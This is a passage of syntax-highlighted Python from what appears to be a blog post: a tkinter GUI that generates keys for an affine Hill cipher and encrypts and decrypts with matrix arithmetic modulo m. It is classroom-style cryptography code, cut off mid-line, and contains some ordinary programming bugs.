class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tkinter.simpledialog <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a%b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span><span class="params">(a,b,x,y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b==<span class="number">0</span>:</span><br><span class="line">        x=<span class="number">1</span></span><br><span class="line">        y=<span class="number">0</span></span><br><span class="line">    d = exgcd(b,a%b,y,x)</span><br><span class="line">    y = y - (a/b)*x</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseElement</span><span class="params">(b,p)</span>:</span><span class="comment">#求逆元</span></span><br><span class="line">    inv = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (inv*b)%p == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        inv = inv +<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> inv</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Det</span><span class="params">(a,n)</span>:</span><span class="comment">#求行列式</span></span><br><span class="line">    b = np.zeros((n, n))<span class="comment">#临时数组用于降阶</span></span><br><span class="line">    sum = int(<span class="number">0</span>)</span><br><span class="line">    sign = int(<span class="number">0</span>)</span><br><span class="line">    p = int(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):<span class="comment">#此处大循环实现将余子式存入数组b中</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">if</span> c&lt;i:</span><br><span class="line">                    p = <span class="number">0</span><span class="comment">#当p=0时，行列式只向左移，即消去对应的第一列的数</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    p = <span class="number">1</span><span class="comment">#否则行列式左移后再上移</span></span><br><span class="line">                b[c][j]=a[c+p][j+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            sign = <span class="number">1</span><span class="comment">#i为偶数，加法</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sign = <span class="number">-1</span><span class="comment">#i为奇数，减法</span></span><br><span class="line">        sum = sum + a[i][<span class="number">0</span>]*Det(b,n<span class="number">-1</span>)*sign<span class="comment">#计算行列式的值</span></span><br><span class="line">    <span class="keyword">return</span>  sum</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAStart</span><span class="params">(arcs,n,ans)</span>:</span><span class="comment">#计算每一行每一列的每个元素所对应的余子式，组成A*</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        ans[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    temp = np.zeros((n, n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">                    temp[k][t] = arcs[(k+<span class="number">1</span> <span class="keyword">if</span> k&gt;=i <span class="keyword">else</span> k)][(t+<span class="number">1</span> <span class="keyword">if</span> t&gt;=j <span class="keyword">else</span> t)]</span><br><span class="line">                ans[j][i] = Det(temp,n<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">if</span> (i+j)%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                    ans[j][i] = -ans[j][i]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">InverseMat</span><span class="params">(a,n,p,ans)</span>:</span></span><br><span class="line">    astar = np.zeros((n, n))</span><br><span class="line">    getAStart(a, n, astar)<span class="comment">#求A的伴随矩阵</span></span><br><span class="line">    deta = int(Det(a,n))<span class="comment">#求A的行列式</span></span><br><span class="line">    <span class="keyword">if</span> deta &lt; <span class="number">0</span>:</span><br><span class="line">        deta = deta + p</span><br><span class="line">    inv = int(InverseElement(deta,p))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            ans[i][j] = astar[i][j]*inv</span><br><span class="line">            ans[i][j] = ans[i][j]%p</span><br><span class="line">            <span class="keyword">if</span> ans[i][j] &lt;<span class="number">0</span>:</span><br><span class="line">                ans[i][j] = ans[i][j] + p</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AtoN</span><span class="params">(A)</span>:</span><span class="comment">#处理字符和数字的关系</span></span><br><span class="line">    N = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>(ord(A)&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(A)&lt;=<span class="number">90</span>):</span><br><span class="line">        N = ord(A) - ord(<span class="string">'A'</span>)</span><br><span class="line">    <span class="keyword">if</span> (ord(A) &gt;= <span class="number">97</span> <span class="keyword">and</span> ord(A) &lt;= <span class="number">122</span>):</span><br><span class="line">        N = ord(A) - ord(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">return</span> N</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NtoA</span><span class="params">(N)</span>:</span></span><br><span class="line">    A = chr(N + ord(<span class="string">'A'</span>))</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span><span class="params">(clearlist,A,B,n,N)</span>:</span><span class="comment">#加密函数</span></span><br><span class="line">    CipherText = []</span><br><span class="line">    lenth = len(clearlist)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="comment">#补位操作</span></span><br><span class="line">    <span class="keyword">if</span>(lenth%n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n-lenth%n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        clearlist.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(clearlist)/n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clearlist)):</span><br><span class="line">        clearlist[i] = AtoN(clearlist[i])</span><br><span class="line">    <span class="comment">#生成M序列</span></span><br><span class="line">    M = np.ones((groups,n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = clearlist[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，A*M+Bmod(N)</span></span><br><span class="line">        tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现A*M</span></span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">            tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现+</span></span><br><span class="line">            tmpp[row][<span class="number">0</span>] = (tmpp[row][<span class="number">0</span>] + B[row][<span class="number">0</span>]) % N</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            CipherText.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> CipherText[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> CipherText</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span><span class="params">(CipherText,A,B,n,N)</span>:</span><span class="comment">#解密函数</span></span><br><span class="line">    clearlist = []</span><br><span class="line">    lenth = len(CipherText)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 补位操作</span></span><br><span class="line">    <span class="keyword">if</span> (lenth % n == <span class="number">0</span>):</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        offset = n - lenth % n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):</span><br><span class="line">        CipherText.append(<span class="string">'A'</span>)</span><br><span class="line">    groups = int(len(CipherText) / n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(CipherText)):</span><br><span class="line">        CipherText[i] = AtoN(CipherText[i])</span><br><span class="line">    <span class="comment"># 生成M序列</span></span><br><span class="line">    M = np.zeros((groups, n))</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(groups):</span><br><span class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">            M[row][column] = CipherText[index]</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">    <span class="comment">#求C-B</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(groups):<span class="comment">#实现矩阵乘法和矩阵加法，InA*(C-B)</span></span><br><span class="line">        tmp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        tmpp = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#初始化Mi</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = M[i][row]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):  <span class="comment"># 实现C-B</span></span><br><span class="line">            tmp[row][<span class="number">0</span>] = tmp[row][<span class="number">0</span>] - B[row][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):<span class="comment">#实现InA*(C-B)mod(N)</span></span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                tmpp[row][<span class="number">0</span>] = int(tmpp[row][<span class="number">0</span>] + (int(tmp[column][<span class="number">0</span>]) * int(A[row][column])))</span><br><span class="line">            tmpp[row][<span class="number">0</span>] = int((tmpp[row][<span class="number">0</span>]) % N)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            clearlist.append(NtoA(int(tmpp[row][<span class="number">0</span>])))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(offset):<span class="comment">#消除补位影响</span></span><br><span class="line">            <span class="keyword">del</span> clearlist[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> clearlist</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIdentityMatrix</span><span class="params">(n)</span>:</span><span class="comment">#生成单位矩阵</span></span><br><span class="line">    A = np.zeros((n,n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                A[i][j] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                A[i][j] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInvertibleMatrix</span><span class="params">(n,m)</span>:</span><span class="comment">#生成可逆矩阵</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        A = getIdentityMatrix(n)</span><br><span class="line">        tempArray = np.zeros(n)</span><br><span class="line">        B = np.zeros((n,n))</span><br><span class="line">        transformTime = int(random.randint(<span class="number">0</span>,<span class="number">1000</span>))</span><br><span class="line">        maxint = sys.maxsize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(transformTime):</span><br><span class="line">            mainRowNum = int((random.randint(<span class="number">0</span>,n) % (n - <span class="number">1</span>)))<span class="comment">#选择一个主行作初等行变换</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="comment">#元素数值是否会溢出</span></span><br><span class="line">                <span class="keyword">if</span> maxint - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &lt; <span class="number">0</span> <span class="keyword">and</span> maxint*(<span class="number">-1</span>) - (A[mainRowNum][k])*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))) &gt; tempArray[k]:</span><br><span class="line">                    tempArray[k] = A[mainRowNum][k]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tempArray[k] = (A[mainRowNum][k]*(int(random.randint(<span class="number">0</span>,<span class="number">10</span>))))%m</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">                <span class="keyword">if</span> mainRowNum != j:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> range(n):</span><br><span class="line">                        <span class="keyword">if</span> maxint - A[j][k]&lt; tempArray[k] <span class="keyword">and</span> maxint * (<span class="number">-1</span>) - (A[j][k]) &gt; tempArray[k]:</span><br><span class="line">                            A[j][k] = (A[j][k]/<span class="number">4</span>)%m</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            A[j][k] = (A[j][k] + tempArray[k])%m</span><br><span class="line">        <span class="keyword">if</span> gcd(np.linalg.det(A),m) == <span class="number">1</span> <span class="keyword">and</span> np.linalg.det(A) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nnb</span><span class="params">()</span>:</span></span><br><span class="line">    messagebox.showinfo(<span class="string">"Succesfull"</span>, <span class="string">"File is in your computer!"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newwind</span><span class="params">(n,m)</span>:</span></span><br><span class="line">    winNew = Toplevel(window)</span><br><span class="line">    winNew.geometry(<span class="string">'320x400'</span>)</span><br><span class="line">    winNew.title(<span class="string">'Random Key'</span>)</span><br><span class="line">    lb1 = tk.Label(winNew, text=<span class="string">'Random A Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    lb1.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    nt1 = tk.Text(winNew, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    nt1.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    lb2 = tk.Label(winNew, text=<span class="string">'Random B Key'</span>, font=(<span class="string">'Arial'</span>, <span class="number">16</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    lb2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    nt2 = tk.Text(winNew, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    nt2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    nb = tk.Button(winNew, text=<span class="string">'Save'</span>, font=(<span class="string">'Arial'</span>, <span class="number">12</span>), width=<span class="number">10</span>, height=<span class="number">1</span>, command=nnb)</span><br><span class="line">    nb.pack()</span><br><span class="line">    lb3 = tk.Label(winNew, text=<span class="string">'@FZU-IS-404 ZERO-A-ONE'</span>, font=(<span class="string">'Arial'</span>, <span class="number">10</span>), width=<span class="number">40</span>, height=<span class="number">2</span>)</span><br><span class="line">    lb3.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">    A = getInvertibleMatrix(n,m)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        B[row] = int(random.randint(<span class="number">0</span>, <span class="number">26</span>))</span><br><span class="line">    At = open(<span class="string">'A_key.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">    Bt = open(<span class="string">'B_key.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        str1 = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> range(n):</span><br><span class="line">            str1 += str(int(A[row][line]))</span><br><span class="line">            str1 += <span class="string">' '</span></span><br><span class="line">        str1 += <span class="string">"\n"</span></span><br><span class="line">        At.write(str1)</span><br><span class="line">        nt1.insert(<span class="string">"%d.%d"</span> % (<span class="number">0</span>, int(row)),str1)</span><br><span class="line">    At.close()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        str2 = <span class="string">""</span></span><br><span class="line">        str2 += str(int(A[row][<span class="number">0</span>]))</span><br><span class="line">        str2 += <span class="string">"\n"</span></span><br><span class="line">        Bt.write(str2)</span><br><span class="line">        nt2.insert(<span class="string">"%d.%d"</span> % (<span class="number">0</span>, int(row)), str2)</span><br><span class="line">    Bt.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nb1</span><span class="params">()</span>:</span></span><br><span class="line">    fo = open(<span class="string">"text.txt"</span>, <span class="string">"r+"</span>)</span><br><span class="line">    str = fo.read()</span><br><span class="line">    tt2.insert(INSERT, str)</span><br><span class="line">    fo.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buttonRK</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> e1.get() != <span class="string">""</span> <span class="keyword">and</span> e2.get() != <span class="string">""</span>:</span><br><span class="line">        n = int(e1.get())</span><br><span class="line">        m = int(e2.get())</span><br><span class="line">        newwind(n,m)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showinfo(<span class="string">"Error"</span>, <span class="string">"Please input n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2wind</span><span class="params">(ans,n)</span>:</span></span><br><span class="line">    n2wind = Toplevel(window)</span><br><span class="line">    n2wind.geometry(<span class="string">'300x130'</span>)</span><br><span class="line">    n2wind.title(<span class="string">'Inverse Matrix'</span>)</span><br><span class="line">    n2nt2 = tk.Text(n2wind, height=<span class="number">8</span>, width=<span class="number">40</span>)</span><br><span class="line">    n2nt2.pack(fill=<span class="string">'x'</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">        str1 = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> range(n):</span><br><span class="line">            str1 += str(int(ans[row][line]))</span><br><span class="line">            str1 += <span class="string">' '</span></span><br><span class="line">        str1 += <span class="string">"\n"</span></span><br><span class="line">        n2nt2.insert(<span class="string">"%d.%d"</span> % (<span class="number">0</span>, int(row)),str1)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dewin</span><span class="params">()</span>:</span><span class="comment">#解密函数GUI</span></span><br><span class="line">    <span class="keyword">if</span> t1.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span class="keyword">and</span> t2.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span class="keyword">and</span> e1.get() != <span class="string">""</span> <span class="keyword">and</span> e2.get() != <span class="string">""</span>:</span><br><span class="line">        n = int(e1.get())</span><br><span class="line">        m = int(e2.get())</span><br><span class="line">        A = np.zeros((n, n))</span><br><span class="line">        B = np.zeros((n, <span class="number">1</span>))</span><br><span class="line">        InA = np.zeros((n, n))</span><br><span class="line">        Atex = t1.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringA = <span class="string">' '</span>.join(Atex.split())</span><br><span class="line">        listA = list(stringA.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            <span class="keyword">for</span> column <span class="keyword">in</span> range(n):</span><br><span class="line">                A[row][column] = int(listA[index])</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        Btex = t2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        stringB = <span class="string">' '</span>.join(Btex.split())</span><br><span class="line">        listB = list(stringB.split(<span class="string">' '</span>))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> range(n):</span><br><span class="line">            B[row][<span class="number">0</span>] = int(listB[index])</span><br><span class="line">            index = index + <span class="number">1</span></span><br><span class="line">        clear = tt2.get(<span class="string">"1.0"</span>, <span class="string">"end"</span>)</span><br><span class="line">        clear = list(clear)</span><br><span class="line">        InA = InverseMat(A, n, m, InA)</span><br><span class="line">        klist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">' '</span>:</span><br><span class="line">                klist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        dlist = np.zeros(len(clear))</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                dlist[index] = int(i)</span><br><span class="line">                index = index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clear)):</span><br><span class="line">            <span class="keyword">if</span> clear[i] == <span class="string">','</span>:</span><br><span class="line">                clear[i] = <span class="string">' '</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">' '</span> <span class="keyword">in</span> clear:</span><br><span class="line">            clear.remove(<span class="string">' '</span>)</span><br><span class="line">        print(dlist)</span><br><span class="line">        print(klist)</span><br><span class="line">        clearlist = Decrypt(clear, InA, B, n, m)</span><br><span class="line">        print(clearlist)</span><br><span class="line">        clearlist = list(clearlist)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(klist)):</span><br><span class="line">            <span class="keyword">if</span> klist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(klist[i])</span><br><span class="line">            clearlist.insert(ind, <span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dlist)):</span><br><span class="line">            <span class="keyword">if</span> dlist[i] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            ind = int(dlist[i])</span><br><span class="line">            clearlist.insert(ind, <span class="string">","</span>)</span><br><span class="line">        str = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(clearlist)):</span><br><span class="line">            str += clearlist[i]</span><br><span class="line">        t3.insert(INSERT, str)</span><br><span class="line">        n2wind(InA,n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        messagebox.showinfo(<span class="string">"Error"</span>, <span class="string">"Please input n,m,A key,B key"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Enwin</span><span class="params">()</span>:</span><span class="comment">#加密函数GUI</span></span><br><span class="line">    <span class="keyword">if</span> t1.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span class="keyword">and</span> t2.get(<span class="string">"0.0"</span>,<span class="string">"end"</span>) != <span class="string">""</span> <span 